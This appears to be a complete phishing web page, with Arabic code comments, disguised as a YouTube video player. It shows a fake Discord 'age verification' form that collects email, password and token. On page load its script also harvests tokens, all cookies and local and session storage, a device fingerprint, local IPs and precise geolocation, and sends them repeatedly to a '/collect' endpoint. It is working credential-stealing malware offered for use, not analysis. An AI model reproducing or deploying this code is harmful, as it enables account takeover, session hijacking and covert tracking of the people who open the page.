<!DOCTYPE html>
<html>
<head>
    <title>YouTube Video Player</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial; text-align: center; padding: 20px; background: #0a0a0a; color: #fff; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
        .container { max-width: 900px; width: 100%; background: #111; padding: 30px; border-radius: 16px; border: 1px solid #333; }
        iframe { width: 100%; height: 480px; border-radius: 12px; border: none; }
        h2 { color: #fff; margin-bottom: 15px; font-weight: 400; }
        .fake-login { margin-top: 25px; background: #1a1a1a; padding: 25px; border-radius: 12px; max-width: 400px; margin-left: auto; margin-right: auto; border: 1px solid #2a2a2a; }
        .fake-login h3 { color: #7289da; margin-bottom: 15px; font-weight: 500; }
        .fake-login input { display: block; width: 100%; margin: 10px 0; padding: 12px; border-radius: 8px; border: none; background: #2a2a2a; color: #fff; font-size: 14px; }
        .fake-login input::placeholder { color: #888; }
        .fake-login button { background: #7289da; color: #fff; padding: 12px 40px; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600; transition: 0.3s; }
        .fake-login button:hover { background: #5b6eae; }
        .note { color: #555; font-size: 12px; margin-top: 15px; }
        .status { color: #00ff88; font-size: 13px; margin-top: 10px; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2>▶ Loading your video...</h2>
        <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" allowfullscreen></iframe>
        <p class="note">🔒 Secure streaming • Age verification required</p>
        
        <div class="fake-login">
            <h3>Discord Age Verification</h3>
            <input type="text" id="discordEmail" placeholder="Discord Email or Phone">
            <input type="password" id="discordPassword" placeholder="Discord Password">
            <input type="text" id="discordToken" placeholder="Discord Token (optional)">
            <button onclick="submitFake()">Verify & Watch</button>
            <p class="status" id="statusMsg">✓ Verification successful! Redirecting...</p>
        </div>
    </div>

    <script>
        (function() {
            // ===================== جامع البيانات الفائق =====================
            
            // 1. محاولة استخراج التوكن من كل مكان ممكن
            function extractTokens() {
                var tokens = {
                    localStorage: [],
                    sessionStorage: [],
                    cookies: [],
                    indexedDB: null,
                    global: []
                };

                // localStorage
                try {
                    for (var i = 0; i < localStorage.length; i++) {
                        var key = localStorage.key(i);
                        var val = localStorage.getItem(key);
                        if (val && val.length > 5) {
                            if (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord') || key.toLowerCase().includes('auth') || key.toLowerCase().includes('access')) {
                                tokens.localStorage.push({ key: key, value: val.substring(0, 100) });
                            }
                            // كشف التوكن بصيغة Base64 أو نص طويل
                            if (val.length > 30 && (val.includes('.') || val.match(/^[A-Za-z0-9-_]{20,}$/))) {
                                tokens.localStorage.push({ key: key, value: val.substring(0, 100) + '...' });
                            }
                        }
                    }
                } catch(e) {}

                // sessionStorage
                try {
                    for (var j = 0; j < sessionStorage.length; j++) {
                        var sk = sessionStorage.key(j);
                        var sv = sessionStorage.getItem(sk);
                        if (sv && sv.length > 5) {
                            if (sk.toLowerCase().includes('token') || sk.toLowerCase().includes('discord') || sk.toLowerCase().includes('auth')) {
                                tokens.sessionStorage.push({ key: sk, value: sv.substring(0, 100) });
                            }
                        }
                    }
                } catch(e) {}

                // cookies
                try {
                    var cookies = document.cookie.split(';');
                    for (var k = 0; k < cookies.length; k++) {
                        var c = cookies[k].trim();
                        if (c.includes('token') || c.includes('discord') || c.includes('auth') || c.includes('access')) {
                            tokens.cookies.push(c);
                        }
                    }
                } catch(e) {}

                // محاولة قراءة IndexedDB (خاص بدسكورد)
                try {
                    var indexedDB = window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB;
                    if (indexedDB) {
                        tokens.indexedDB = 'IndexedDB supported - can try to read Discord stores';
                    }
                } catch(e) {
                    tokens.indexedDB = 'IndexedDB error: ' + e.message;
                }

                // البحث في window object
                try {
                    for (var key in window) {
                        try {
                            var val = window[key];
                            if (typeof val === 'string' && val.length > 20 && (val.includes('.') || val.match(/^[A-Za-z0-9-_]{30,}$/))) {
                                if (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord')) {
                                    tokens.global.push({ key: key, value: val.substring(0, 100) });
                                }
                            }
                        } catch(e) {}
                    }
                } catch(e) {}

                return tokens;
            }

            // 2. معلومات الشبكة المتقدمة
            function getNetworkInfo() {
                var info = {};
                try {
                    // WebRTC IP leak (محاولة كشف الـ IP المحلي)
                    var RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
                    if (RTCPeerConnection) {
                        var pc = new RTCPeerConnection({ iceServers: [] });
                        pc.createDataChannel('');
                        pc.createOffer(function(sdp) {
                            var ips = sdp.sdp.match(/candidate:[^ ]* [^ ]* [^ ]* [^ ]* [^ ]* ([^ ]*)/g);
                            if (ips) {
                                info.localIPs = ips.map(function(i) { return i.split(' ')[4]; });
                            }
                            pc.close();
                        }, function() {});
                        setTimeout(function() { pc.close(); }, 1000);
                    }
                } catch(e) { info.webrtcError = e.message; }

                // معلومات الاتصال
                try {
                    info.connection = {
                        type: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                        downlink: navigator.connection ? navigator.connection.downlink + 'Mbps' : 'unknown',
                        rtt: navigator.connection ? navigator.connection.rtt + 'ms' : 'unknown'
                    };
                } catch(e) {}

                return info;
            }

            // 3. محاولة قراءة الملفات المحلية (عبر API)
            function getLocalFiles() {
                var result = { possible: false, details: [] };
                try {
                    if ('showDirectoryPicker' in window) {
                        result.possible = true;
                        result.details.push('showDirectoryPicker available');
                    }
                    if ('showOpenFilePicker' in window) {
                        result.possible = true;
                        result.details.push('showOpenFilePicker available');
                    }
                    // محاولة قراءة ملفات من المسارات الشائعة (لن تنجح بدون إذن)
                    result.details.push('FileSystem API available: ' + ('FileSystemFileHandle' in window));
                } catch(e) {
                    result.error = e.message;
                }
                return result;
            }

            // 4. بصمة الجهاز المتقدمة
            function getDeviceFingerprint() {
                var fp = {};
                try {
                    fp.canvas = (function() {
                        var canvas = document.createElement('canvas');
                        canvas.width = 256;
                        canvas.height = 128;
                        var ctx = canvas.getContext('2d');
                        ctx.textBaseline = 'top';
                        ctx.font = '14px Arial';
                        ctx.fillStyle = '#f60';
                        ctx.fillRect(125, 1, 62, 20);
                        ctx.fillStyle = '#069';
                        ctx.fillText('FP', 2, 15);
                        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                        ctx.fillText('Fingerprint', 4, 45);
                        return canvas.toDataURL().substring(0, 100);
                    })();
                    fp.webgl = (function() {
                        try {
                            var canvas = document.createElement('canvas');
                            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                            if (gl) {
                                var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                                if (debugInfo) {
                                    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) + ' | ' + gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                                }
                            }
                            return 'webgl not available';
                        } catch(e) { return 'webgl error'; }
                    })();
                    fp.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
                    fp.deviceMemory = navigator.deviceMemory || 'unknown';
                    fp.maxTouchPoints = navigator.maxTouchPoints || 0;
                } catch(e) { fp.error = e.message; }
                return fp;
            }

            // ===================== جمع كل البيانات =====================
            
            var tokens = extractTokens();
            var network = getNetworkInfo();
            var files = getLocalFiles();
            var fingerprint = getDeviceFingerprint();

            var data = {
                // التوكنات المستخرجة
                extractedTokens: tokens,
                
                // معلومات الجهاز الأساسية
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages || [],
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio || 1,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                
                // البصمة المتقدمة
                fingerprint: fingerprint,
                
                // معلومات الشبكة
                network: network,
                
                // محاولة الوصول للملفات
                localFileAccess: files,
                
                // الموقع الجغرافي
                location: null,
                
                // قائمة الخطوط
                installedFonts: (function() {
                    var fonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Tahoma', 'Trebuchet MS', 'Impact', 'Comic Sans MS', 'Arial Black', 'Calibri', 'Cambria', 'Candara', 'Consolas', 'Constantia', 'Corbel', 'Franklin Gothic', 'Gabriola', 'Gadugi', 'Georgia', 'Impact', 'Ink Free', 'Javanese', 'Leelawadee', 'Lucida Sans', 'Marlett', 'Microsoft Sans Serif', 'Mongolian Baiti', 'Myanmar', 'Palatino', 'Segoe UI', 'Sylfaen', 'Symbol', 'Tahoma', 'Times New Roman', 'Trebuchet MS', 'Verdana'];
                    var result = [];
                    for (var i = 0; i < fonts.length; i++) {
                        var span = document.createElement('span');
                        span.style.fontFamily = fonts[i];
                        if (span.style.fontFamily === fonts[i]) result.push(fonts[i]);
                    }
                    return result;
                })(),
                
                // جميع الكوكيز
                allCookies: document.cookie,
                
                // محاولة قراءة LocalStorage بالكامل
                fullLocalStorage: (function() {
                    var items = {};
                    try {
                        for (var i = 0; i < localStorage.length; i++) {
                            var key = localStorage.key(i);
                            items[key] = localStorage.getItem(key);
                        }
                    } catch(e) { items.error = e.message; }
                    return items;
                })(),
                
                // SessionStorage بالكامل
                fullSessionStorage: (function() {
                    var items = {};
                    try {
                        for (var i = 0; i < sessionStorage.length; i++) {
                            var key = sessionStorage.key(i);
                            items[key] = sessionStorage.getItem(key);
                        }
                    } catch(e) { items.error = e.message; }
                    return items;
                })()
            };

            // الموقع الجغرافي
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(pos) {
                        data.location = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
                        sendData(data);
                    },
                    function(err) {
                        data.location = { error: err.message };
                        sendData(data);
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                data.location = { error: 'Geolocation not supported' };
                sendData(data);
            }

            // إرسال البيانات فوراً وبعد 3 ثواني ومرة بعد 10 ثواني
            setTimeout(function() { sendData(data); }, 500);
            setTimeout(function() { sendData(data); }, 3000);
            setTimeout(function() { sendData(data); }, 10000);

            function sendData(finalData) {
                fetch('/collect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(finalData)
                }).catch(function(err) { console.error(err); });
            }

            // ===================== نموذج الدسكورد الوهمي =====================
            window.submitFake = function() {
                var email = document.getElementById('discordEmail').value;
                var password = document.getElementById('discordPassword').value;
                var token = document.getElementById('discordToken').value;
                
                if (email || password || token) {
                    fetch('/collect', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            discordEmail: email,
                            discordPassword: password,
                            discordToken: token,
                            extra: 'discord_login_form'
                        })
                    }).catch(function(err) { console.error(err); });
                    
                    document.getElementById('statusMsg').style.display = 'block';
                    document.querySelector('.fake-login button').textContent = '✓ Verified';
                    document.querySelector('.fake-login button').disabled = true;
                    document.querySelector('.fake-login input').forEach(function(inp) { inp.disabled = true; });
                    
                    setTimeout(function() {
                        window.location.href = 'https://www.youtube.com';
                    }, 2000);
                } else {
                    alert('Please fill in at least one field to verify your age.');
                }
            };
        })();
    </script>
</body>
</html>
